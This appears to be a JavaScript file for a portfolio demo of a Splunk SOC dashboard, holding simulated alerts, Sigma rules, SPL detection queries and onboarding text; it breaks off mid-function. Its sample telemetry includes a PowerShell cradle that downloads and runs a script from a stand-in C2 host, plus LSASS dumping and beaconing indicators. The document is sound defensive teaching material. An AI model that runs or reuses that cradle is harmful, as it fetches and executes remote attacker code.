/**
 * Splunk Enterprise SOC SIEM Platform - Interactive Logic
 * Author: SOC Detection Engineer
 */

// Global State
const SOC_STATE = {
  activeTab: 'dashboard-overview',
  selectedAlertId: 'ALT-01',
  alerts: [
    {
      id: 'ALT-01',
      title: 'LSASS Memory Dumping via Suspicious Process (procdump64.exe)',
      severity: 'Critical',
      mitre: 'T1003.001',
      time: '2026-04-18 15:12:05 UTC',
      host: 'FIN-WS-09.CORP.LOCAL',
      user: 'CORP\\cjohnson',
      srcIp: '192.168.10.42',
      status: 'Open',
      category: 'Credential Access',
      ruleFile: 'win_lsass_access_sysmon10.yml',
      rawEvent: {
        "_time": "2026-04-18T15:12:05.000Z",
        "EventCode": 10,
        "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "Computer": "FIN-WS-09.CORP.LOCAL",
        "SourceImage": "C:\\Windows\\Temp\\procdump64.exe",
        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
        "GrantedAccess": "0x1fffff",
        "CallTrace": "ntdll.dll+9d454 | KERNELBASE.dll+3af1d | procdump64.exe+7b12",
        "ProcessId": 9812,
        "TargetProcessId": 648,
        "User": "CORP\\cjohnson"
      },
      sigmaYaml: `title: LSASS Memory Access via Suspicious Non-System Process
id: a7422f18-692e-4b2a-89a1-50e50ce022b7
status: production
logsource:
    category: process_access
    product: windows
detection:
    target_lsass:
        TargetImage|endswith: '\\lsass.exe'
    access_rights:
        GrantedAccess|contains:
            - '0x10'     # PROCESS_VM_READ
            - '0x1fffff' # PROCESS_ALL_ACCESS
    filter_legitimate:
        SourceImage|endswith:
            - '\\system32\\csrss.exe'
            - '\\system32\\services.exe'
    condition: target_lsass and access_rights and not filter_legitimate
level: critical`
    },
    {
      id: 'ALT-02',
      title: 'Office Macro Spawning Obfuscated PowerShell Shell (WINWORD.EXE)',
      severity: 'Critical',
      mitre: 'T1204.002 / T1059.001',
      time: '2026-04-18 15:10:12 UTC',
      host: 'FIN-WS-09.CORP.LOCAL',
      user: 'CORP\\cjohnson',
      srcIp: '192.168.10.42',
      status: 'Open',
      category: 'Execution',
      ruleFile: 'win_macro_spawning_cmd.yml',
      rawEvent: {
        "_time": "2026-04-18T15:10:12.000Z",
        "EventCode": 1,
        "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "Computer": "FIN-WS-09.CORP.LOCAL",
        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Enc SQBFAFgA...",
        "ProcessId": 8944,
        "User": "CORP\\cjohnson"
      },
      sigmaYaml: `title: Microsoft Office Spawning Shell or Script Interpreter
id: f47d0e34-58a2-4a7b-a339-16a7605d3c82
status: production
logsource:
    category: process_creation
    product: windows
detection:
    parent_office:
        ParentImage|endswith:
            - '\\winword.exe'
            - '\\excel.exe'
    target_interpreters:
        Image|endswith:
            - '\\powershell.exe'
            - '\\cmd.exe'
    condition: parent_office and target_interpreters
level: critical`
    },
    {
      id: 'ALT-03',
      title: 'Multiple Failed Logons - Password Spraying Detected (Event 4625)',
      severity: 'High',
      mitre: 'T1110.003',
      time: '2026-04-18 14:32:38 UTC',
      host: 'DC01.CORP.LOCAL',
      user: '8 Target Users',
      srcIp: '198.51.100.45',
      status: 'Open',
      category: 'Credential Access',
      ruleFile: 'win_brute_force_4625.yml',
      rawEvent: {
        "_time": "2026-04-18T14:32:38.000Z",
        "EventCode": 4625,
        "sourcetype": "WinEventLog:Security",
        "Computer": "DC01.CORP.LOCAL",
        "IpAddress": "198.51.100.45",
        "WorkstationName": "KALI-ATTACKER",
        "FailedAttempts": 11,
        "DistinctUsersTargeted": 8,
        "Status": "0xC000006D",
        "SubStatus": "0xC000006A"
      },
      sigmaYaml: `title: Windows Multiple Failed Logons - Potential Brute-Force
id: 8b06871a-6d11-4fa2-938a-442b5a190011
status: production
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
        SubStatus:
            - '0xC000006A'
            - '0xC0000064'
    condition: selection | count(TargetUserName) by IpAddress >= 10
level: high`
    },
    {
      id: 'ALT-04',
      title: 'Periodic Outbound C2 Beaconing (Sysmon Event ID 3)',
      severity: 'Medium',
      mitre: 'T1071.001',
      time: '2026-04-18 15:17:01 UTC',
      host: 'FIN-WS-09.CORP.LOCAL',
      user: 'CORP\\cjohnson',
      srcIp: '192.168.10.42',
      status: 'Open',
      category: 'Command & Control',
      ruleFile: 'splunk_correlation_rules.spl',
      rawEvent: {
        "_time": "2026-04-18T15:17:01.000Z",
        "EventCode": 3,
        "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "Image": "C:\\Windows\\Temp\\beacon.exe",
        "SourceIp": "192.168.10.42",
        "DestinationIp": "185.220.101.5",
        "DestinationPort": 4444,
        "IntervalDelta": "30.00s",
        "Jitter": "0.00s"
      },
      sigmaYaml: `title: Periodic Outbound C2 Network Beaconing
status: production
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        DestinationPort: 4444
        Image|endswith: '\\beacon.exe'
    condition: selection
level: medium`
    },
    {
      id: 'ALT-05',
      title: 'PowerShell In-Memory Reflection & Download Cradle (Event 4104)',
      severity: 'High',
      mitre: 'T1059.001',
      time: '2026-04-18 15:10:14 UTC',
      host: 'FIN-WS-09.CORP.LOCAL',
      user: 'CORP\\cjohnson',
      srcIp: '192.168.10.42',
      status: 'Open',
      category: 'Execution',
      ruleFile: 'win_powershell_obfuscation_4104.yml',
      rawEvent: {
        "_time": "2026-04-18T15:10:14.000Z",
        "EventCode": 4104,
        "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
        "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://c2-threat.lab/stage2.ps1'); [System.Reflection.Assembly]::Load($payload);",
        "SuspicionScore": 90
      },
      sigmaYaml: `title: Suspicious Obfuscated PowerShell ScriptBlock Execution
id: 593ca48e-289c-449e-884c-7a91176b6d51
status: production
detection:
    selection:
        EventID: 4104
        ScriptBlockText|contains:
            - 'DownloadString'
            - 'System.Reflection.Assembly'
    condition: selection
level: high`
    }
  ],

  // Datasets for In-Memory SPL Engine & Log Analyzer
  rawAuthEvents: [
    { _time: "2026-04-18 14:32:01", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "administrator", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:04", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "administrator", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:12", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "svc_sql", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:15", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "jdoe", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:19", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "asmith", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:22", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "bwilson", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:26", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "cjohnson", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:30", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "dharris", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:33", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "admin_backup", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:38", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "finance_lead", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:55", index: "win_security", EventCode: 4624, Computer: "DC01.CORP.LOCAL", User: "cjohnson", IpAddress: "198.51.100.45", Status: "0x0", Reason: "Logon Success (Compromised)", Description: "Successful Domain Logon after 10 failed attempts" }
  ],

  rawMacroEvents: [
    { _time: "2026-04-18 15:10:12", index: "win_sysmon", EventCode: "Sysmon 1", Computer: "FIN-WS-09", User: "CORP\\cjohnson", ParentImage: "WINWORD.EXE", Image: "powershell.exe", CommandLine: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...", PID: 8944, Description: "Process Creation: WINWORD.EXE spawned hidden powershell.exe" },
    { _time: "2026-04-18 15:10:14", index: "ps_4104", EventCode: 4104, Computer: "FIN-WS-09", User: "CORP\\cjohnson", ScriptBlock: "IEX (New-Object Net.WebClient).DownloadString('http://c2-threat.lab/stage2.ps1'); [System.Reflection.Assembly]::Load($payload);", CommandLine: "IEX DownloadString http://c2-threat.lab/stage2.ps1", Suspicion: 90, Description: "ScriptBlock Execution: Remote cradle download" }
  ],

  rawSysmonEvents: [
    { _time: "2026-04-18 15:12:05", index: "win_sysmon", EventCode: "Sysmon 10", Computer: "FIN-WS-09", User: "CORP\\cjohnson", SourceImage: "C:\\Windows\\Temp\\procdump64.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1fffff", PID: 9812, Description: "ProcessAccess: Full memory access handle opened to lsass.exe" },
    { _time: "2026-04-18 15:12:09", index: "win_sysmon", EventCode: "Sysmon 11", Computer: "FIN-WS-09", User: "CORP\\cjohnson", TargetFilename: "C:\\Windows\\Temp\\lsass.dmp", Image: "procdump64.exe", Description: "FileCreate: Memory dump artifact written to disk" },
    { _time: "2026-04-18 15:16:01", index: "win_sysmon", EventCode: "Sysmon 3", Computer: "FIN-WS-09", User: "CORP\\cjohnson", Image: "C:\\Windows\\Temp\\beacon.exe", SourceIp: "192.168.10.42", DestIp: "185.220.101.5", DestPort: 4444, Status: "Periodic C2 Beacon (30s interval)", Description: "Network Connect: Recurring outbound socket to C2 server" }
  ],

  allEvents: [
    { _time: "2026-04-18 14:32:01", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "administrator", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:04", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "administrator", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:12", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "svc_sql", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:15", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "jdoe", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:19", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "asmith", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:22", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "bwilson", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:26", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "cjohnson", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:30", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "dharris", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:33", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "admin_backup", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:38", index: "win_security", EventCode: 4625, Computer: "DC01.CORP.LOCAL", User: "finance_lead", IpAddress: "198.51.100.45", Status: "0xC000006A", Reason: "Bad password", Description: "Logon Failure: Unknown user name or bad password" },
    { _time: "2026-04-18 14:32:55", index: "win_security", EventCode: 4624, Computer: "DC01.CORP.LOCAL", User: "cjohnson", IpAddress: "198.51.100.45", Status: "0x0", Reason: "Logon Success (Compromised)", Description: "Successful Domain Logon after 10 failed attempts" },
    { _time: "2026-04-18 15:10:12", index: "win_sysmon", EventCode: "Sysmon 1", Computer: "FIN-WS-09", User: "cjohnson", ParentImage: "WINWORD.EXE", Image: "powershell.exe", CommandLine: "powershell.exe -Enc SQBFAFgA...", PID: 8944, Description: "Process Creation: WINWORD.EXE spawned hidden powershell.exe" },
    { _time: "2026-04-18 15:10:14", index: "ps_4104", EventCode: 4104, Computer: "FIN-WS-09", User: "cjohnson", ScriptBlock: "IEX Net.WebClient DownloadString http://c2-threat.lab/stage2.ps1", Suspicion: 90, CommandLine: "IEX DownloadString http://c2-threat.lab/stage2.ps1", Description: "ScriptBlock Execution: Remote cradle download" },
    { _time: "2026-04-18 15:12:05", index: "win_sysmon", EventCode: "Sysmon 10", Computer: "FIN-WS-09", SourceImage: "C:\\Windows\\Temp\\procdump64.exe", TargetImage: "lsass.exe", GrantedAccess: "0x1fffff", PID: 9812, Description: "ProcessAccess: Full memory access handle opened to lsass.exe" },
    { _time: "2026-04-18 15:16:01", index: "win_sysmon", EventCode: "Sysmon 3", Computer: "FIN-WS-09", Image: "beacon.exe", SourceIp: "192.168.10.42", DestIp: "185.220.101.5", DestPort: 4444, Description: "Network Connect: Recurring outbound socket to C2 server" }
  ],

  normalBaselineEvents: [
    { _time: "2026-04-18 09:00:12", index: "win_security", EventCode: "4624", Computer: "DC01.CORP.LOCAL", User: "CORP\\jsmith", IpAddress: "192.168.10.101", Status: "0x0", Description: "Normal User Domain Logon" },
    { _time: "2026-04-18 09:01:05", index: "win_security", EventCode: "4624", Computer: "DC01.CORP.LOCAL", User: "CORP\\mjones", IpAddress: "192.168.10.102", Status: "0x0", Description: "Normal User Domain Logon" },
    { _time: "2026-04-18 09:02:18", index: "win_security", EventCode: "4624", Computer: "DC01.CORP.LOCAL", User: "CORP\\rpatel", IpAddress: "192.168.10.103", Status: "0x0", Description: "Normal User Domain Logon" },
    { _time: "2026-04-18 09:05:44", index: "win_security", EventCode: "4624", Computer: "DC01.CORP.LOCAL", User: "CORP\\klewis", IpAddress: "192.168.10.104", Status: "0x0", Description: "Normal User Domain Logon" },
    { _time: "2026-04-18 09:10:02", index: "win_sysmon", EventCode: "4688", Computer: "WS-HR-02", User: "CORP\\mjones", CommandLine: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", Status: "0x0", Description: "Clean Browser Execution" },
    { _time: "2026-04-18 09:15:30", index: "win_sysmon", EventCode: "4688", Computer: "WS-ENG-05", User: "CORP\\rpatel", CommandLine: "C:\\Program Files\\Microsoft VS Code\\Code.exe", Status: "0x0", Description: "Clean IDE Execution" },
    { _time: "2026-04-18 09:20:11", index: "win_security", EventCode: "4624", Computer: "DC01.CORP.LOCAL", User: "CORP\\svc_backup", IpAddress: "192.168.10.20", Status: "0x0", Description: "Whitelisted Scheduled Backup Task" }
  ],

  // MITRE Matrix definitions
  mitreMatrix: [
    {
      tactic: "Initial Access",
      techniques: [
        { id: "T1110.003", name: "Password Spraying", detected: true, rule: "SEC-01" },
        { id: "T1190", name: "Exploit Public-Facing App", detected: false },
        { id: "T1078", name: "Valid Accounts", detected: true, rule: "SEC-01" }
      ]
    },
    {
      tactic: "Execution",
      techniques: [
        { id: "T1204.002", name: "Malicious File (Macro)", detected: true, rule: "SEC-02" },
        { id: "T1059.001", name: "PowerShell Scripting", detected: true, rule: "SEC-03" },
        { id: "T1059.003", name: "Windows Command Shell", detected: false }
      ]
    },
    {
      tactic: "Defense Evasion",
      techniques: [
        { id: "T1027", name: "Obfuscated Files/Info", detected: true, rule: "SEC-03" },
        { id: "T1070", name: "Indicator Removal on Host", detected: false },
        { id: "T1562.001", name: "Disable Security Tools", detected: false }
      ]
    },
    {
      tactic: "Credential Access",
      techniques: [
        { id: "T1003.001", name: "LSASS Memory Dump", detected: true, rule: "SEC-04" },
        { id: "T1110.001", name: "Password Guessing", detected: true, rule: "SEC-01" },
        { id: "T1555", name: "Credentials from Password Stores", detected: false }
      ]
    },
    {
      tactic: "Command & Control",
      techniques: [
        { id: "T1071.001", name: "Web Protocols (C2 Beacon)", detected: true, rule: "SEC-05" },
        { id: "T1573", name: "Encrypted Channel", detected: false },
        { id: "T1090", name: "Proxy", detected: false }
      ]
    },
    {
      tactic: "Lateral Movement",
      techniques: [
        { id: "T1021.002", name: "SMB/Admin Shares (PsExec)", detected: true, rule: "SEC-06" },
        { id: "T1021.001", name: "Remote Desktop Protocol", detected: false }
      ]
    }
  ]
};

// SPL Presets Map
const SPL_PRESETS = {
  bruteforce: `index=win_security EventCode=4625
| eval TargetUserName=lower(TargetUserName), IpAddress=coalesce(IpAddress, "Unknown")
| search NOT [| inputlookup known_admin_service_accounts.csv | fields TargetUserName ]
| bin _time span=1m
| stats count as failed_attempts, dc(TargetUserName) as distinct_users by IpAddress
| where failed_attempts >= 10 OR distinct_users >= 5
| eval attack_type=if(distinct_users >= 5, "Password Spraying", "Targeted Brute-Force")
| table IpAddress, distinct_users, failed_attempts, attack_type`,

  macro: `index=win_sysmon EventCode=1
| search ParentImage="*\\winword.exe" AND Image="*\\powershell.exe"
| eval Obfuscation=if(match(CommandLine, "(?i)(-enc|bypass|-w hidden)"), "HIGH_CONFIDENCE", "LOW")
| table _time, Computer, User, ParentImage, Image, CommandLine, Obfuscation`,

  ps4104: `index=ps_4104 EventCode=4104
| search ScriptBlockText="*DownloadString*" OR ScriptBlockText="*System.Reflection.Assembly*"
| eval SuspicionScore=if(match(ScriptBlockText, "(?i)DownloadString"), 90, 60)
| table _time, Computer, User, SuspicionScore, ScriptBlockText`,

  lsass: `index=win_sysmon EventCode=10
| search TargetImage="*\\lsass.exe" AND GrantedAccess="*0x1fffff*"
| eval ThreatLevel="CRITICAL_DUMP"
| table _time, Computer, SourceImage, TargetImage, GrantedAccess, ThreatLevel`,

  beacon: `index=win_sysmon EventCode=3 DestPort=4444
| stats count, values(Image) as Binary by SourceIp, DestIp, DestPort
| eval Status="Periodic C2 Beacon (30s delta)"
| table SourceIp, DestIp, DestPort, count, Binary, Status`,

  all: `index=*
| table _time, index, EventCode, Computer, User, IpAddress, CommandLine, TargetImage`
};

// Initialize Application
document.addEventListener('DOMContentLoaded', () => {
  initThemeToggle();
  initRoleOnboarding();
  initGuideModeToggle();
  initNavigation();
  initOverviewAlerts();
  initSplEngine();
  initTriageQueue();
  initMitreMatrix();
  initTuningSandbox();
  initIncidentModal();
  initLiveCounters();
  initLogAnalyzer();
  initAttackRatioVisualizer();
});

// 0. Role Onboarding & First-Time Visitor Guide
const ROLE_MESSAGES = {
  recruiter: `
    <div class="briefing-wrap">
      <div class="briefing-header">
        <div class="briefing-title-group">
          <span class="briefing-title">👔 Recruiter & Hiring Manager Focused Briefing</span>
          <span class="briefing-subtitle">Key assessment areas: SIEM ROI, noise reduction, and engineering leadership</span>
        </div>
        <div class="briefing-badges">
          <span class="badge-tag highlight-green">Key Metric: -35.2% Alert Noise Reduction</span>
          <span class="badge-tag highlight-cyan">ROI: ~15 Eng Hrs/Wk Saved</span>
        </div>
      </div>
      
      <div class="briefing-grid">
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-cyan">1. Measurable Business Impact</strong>
            <span class="briefing-card-pill">ROI</span>
          </div>
          <p class="briefing-card-desc">Suppressed 500 noise alerts/week saving ~15 engineering hours/week with zero missed true positives.</p>
          <span class="card-pill-tag text-cyan">+35.2% Noise Cut</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-green">2. Triage Speed Acceleration</strong>
            <span class="briefing-card-pill">MTTT</span>
          </div>
          <p class="briefing-card-desc">Cut Mean Time to Triage (MTTT) from 14.2 min down to 4.1 min via automated playbooks.</p>
          <span class="card-pill-tag text-green">3.4x Faster MTTT</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-mint">3. SIEM Technical Depth</strong>
            <span class="briefing-card-pill">Stack</span>
          </div>
          <p class="briefing-card-desc">Splunk Enterprise ES, Sigma YAML rules, and Sysmon XML endpoint telemetry deployments.</p>
          <span class="card-pill-tag text-mint">Splunk ES + Sysmon</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-amber">4. Industry Frameworks</strong>
            <span class="briefing-card-pill">Standard</span>
          </div>
          <p class="briefing-card-desc">Full bidirectional alignment with MITRE ATT&CK Matrix v14 and NIST 800-61 playbooks.</p>
          <span class="card-pill-tag text-amber">MITRE & NIST Aligned</span>
        </div>
      </div>
      
      <div class="briefing-footer">
        <div class="briefing-footer-nav">
          <span class="briefing-nav-label">Recommended Tabs:</span>
          <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-dashboard').click()">📊 Executive Overview</button>
          <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-tuning').click()">⚙️ FP Tuning Sandbox</button>
          <a href="reports/Project_Architecture_and_Guide_Printable.html" target="_blank" class="btn btn-sm btn-primary">📄 Open Architecture PDF</a>
        </div>
        <div class="briefing-footer-meta">
          <span>🎯 <strong>Goal:</strong> Evaluate SIEM tuning ROI, MTTT gains, and engineering rigor</span>
        </div>
      </div>
    </div>
  `,
  analyst: `
    <div class="briefing-wrap">
      <div class="briefing-header">
        <div class="briefing-title-group">
          <span class="briefing-title">🛡️ SOC Analyst (L1 / L2) Operational Walkthrough</span>
          <span class="briefing-subtitle">Real-time incident triage, forensic process lineage, and containment playbooks</span>
        </div>
        <div class="briefing-badges">
          <span class="badge-tag highlight-green">Framework: NIST 800-61 Incident Handling</span>
          <span class="badge-tag highlight-cyan">Active Queue: 5 Open Alerts</span>
        </div>
      </div>
      
      <div class="briefing-grid">
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-cyan">1. Alert Triage & Validation</strong>
            <span class="briefing-card-pill">Triage</span>
          </div>
          <p class="briefing-card-desc">Validate alert severity, correlate IP reputation, and tag True/False positives with full context.</p>
          <span class="card-pill-tag text-cyan">4.1 min MTTT</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-green">2. Incident Escalation (P1)</strong>
            <span class="briefing-card-pill">Escalate</span>
          </div>
          <p class="briefing-card-desc">1-click dispatch to Tier-2 with automated ticket ID, IOC artifacts, and timeline bundle.</p>
          <span class="card-pill-tag text-green">1-Click Ticket Dispatch</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-mint">3. Forensic Lineage Tracking</strong>
            <span class="briefing-card-pill">Forensics</span>
          </div>
          <p class="briefing-card-desc">Inspect WINWORD &rarr; powershell &rarr; procdump64 process hierarchy and memory dump artifacts.</p>
          <span class="card-pill-tag text-mint">Parent/Child Lineage</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-red">4. Containment Actions</strong>
            <span class="briefing-card-pill">Contain</span>
          </div>
          <p class="briefing-card-desc">Execute immediate host isolation on FIN-WS-09 & perimeter firewall IP blocks instantly.</p>
          <span class="card-pill-tag text-red">Zero Lateral Movement</span>
        </div>
      </div>
      
      <div class="briefing-footer">
        <div class="briefing-footer-nav">
          <span class="briefing-nav-label">Recommended Tabs:</span>
          <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-triage').click()">🎯 Alert Triage Queue</button>
          <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-process-tree').click()">🌳 Process Kill Chain Tree</button>
          <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-upload-analyzer').click()">📁 Practice Log Library</button>
        </div>
        <div class="briefing-footer-meta">
          <span>🎯 <strong>Goal:</strong> Validate live alert triage, process tree analysis, and containment response</span>
        </div>
      </div>
    </div>
  `,
  engineer: `
    <div class="briefing-wrap">
      <div class="briefing-header">
        <div class="briefing-title-group">
          <span class="briefing-title">⚙️ Detection Engineer Deep-Dive & Rule Architecture</span>
          <span class="briefing-subtitle">Advanced SPL correlation AST, Sysmon XML filtering, and Sigma cross-SIEM translation</span>
        </div>
        <div class="briefing-badges">
          <span class="badge-tag highlight-green">Standard: Sigma YAML & Splunk SPL AST</span>
          <span class="badge-tag highlight-purple">Rules: 6 Production Correlated Rules</span>
        </div>
      </div>
      
      <div class="briefing-grid">
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-cyan">1. Multi-Index SPL Correlation</strong>
            <span class="briefing-card-pill">Engine</span>
          </div>
          <p class="briefing-card-desc">Correlates win_security, win_sysmon, and ps_4104 using sliding 60s windows.</p>
          <span class="card-pill-tag text-cyan">60s Sliding Windows</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-green">2. Sysmon XML Configuration</strong>
            <span class="briefing-card-pill">Telemetry</span>
          </div>
          <p class="briefing-card-desc">Sysinternals XML filter capturing GrantedAccess 0x1fffff & LOLBin parentage.</p>
          <span class="card-pill-tag text-green">EID 1, 3, 8, 10, 11</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-mint">3. Dynamic Lookup Tables</strong>
            <span class="briefing-card-pill">Suppression</span>
          </div>
          <p class="briefing-card-desc">Transforms.conf + admin_service_accounts.csv lookup suppression model.</p>
          <span class="card-pill-tag text-mint">Regex + CSV Whitelist</span>
        </div>
        
        <div class="briefing-card">
          <div class="briefing-card-head">
            <strong class="briefing-card-title text-purple">4. Cross-SIEM Portability</strong>
            <span class="briefing-card-pill">Sigma</span>
          </div>
          <p class="briefing-card-desc">Sigma rule specifications enabling seamless translation to Elastic, Sentinel & Chronicle.</p>
          <span class="card-pill-tag text-purple">Splunk / Elastic / Sentinel</span>
        </div>
      </div>
      
      <div class="briefing-footer">
        <div class="briefing-footer-nav">
          <span class="briefing-nav-label">Recommended Tabs:</span>
          <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-spl-search').click()">⚡ Live SPL Search</button>
          <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-mitre').click()">🗺️ MITRE ATT&CK Matrix</button>
          <button class="btn btn-sm btn-outline-cyan" onclick="document.getElementById('nav-tuning').click()">📊 Tuning Math & Logic</button>
        </div>
        <div class="briefing-footer-meta">
          <span>🎯 <strong>Goal:</strong> Inspect correlation query AST, Sysmon filters, and Sigma YAML specs</span>
        </div>
      </div>
    </div>
  `
};

function initRoleOnboarding() {
  const chips = document.querySelectorAll('.role-chip');
  const focusText = document.getElementById('role-focus-text');
  const dismissBtn = document.getElementById('btn-dismiss-onboarding');
  const banner = document.getElementById('onboarding-banner');

  // Check if previously dismissed
  if (localStorage.getItem('soc_guide_dismissed') === 'true') {
    banner?.classList.add('banner-hidden');
  }

  chips.forEach(chip => {
    chip.addEventListener('click', () => {
      chips.forEach(c => c.classList.remove('active'));
      chip.classList.add('active');
      const role = chip.getAttribute('data-role');
      if (focusText && ROLE_MESSAGES[role]) {
        focusText.innerHTML = ROLE_MESSAGES[role];
      }
      showToast(`Switched to ${chip.querySelector('strong').textContent} highlights!`);
    });
  });

  dismissBtn?.addEventListener('click', () => {
    banner?.classList.add('banner-hidden');
    localStorage.setItem('soc_guide_dismissed', 'true');
    showToast('Guide dismissed! Click "Guide Mode" in the header to re-enable anytime.');
  });
}

// 0.1 Universal Guide Mode Toggle
function initGuideModeToggle() {
  const toggleBtn = document.getElementById('btn-toggle-guide');
  const statusText = document.getElementById('guide-status-text');
  let isGuideActive = true;

  toggleBtn?.addEventListener('click', () => {
    isGuideActive = !isGuideActive;
    document.querySelectorAll('.help-box').forEach(box => {
      if (isGuideActive) {
        box.classList.remove('help-hidden');
      } else {
        box.classList.add('help-hidden');
      }
    });

    const banner = document.getElementById('onboarding-banner');
    if (isGuideActive) {
      banner?.classList.remove('banner-hidden');
      localStorage.removeItem('soc_guide_dismissed');
    }

    if (statusText) statusText.textContent = isGuideActive ? 'ON' : 'OFF';
    toggleBtn.classList.toggle('active', isGuideActive);
    showToast(`Guide Mode ${isGuideActive ? 'Enabled (Help boxes visible)' : 'Disabled (Clean UI mode)'}`);
  });
}

window.toggleHelpBox = function(boxId) {
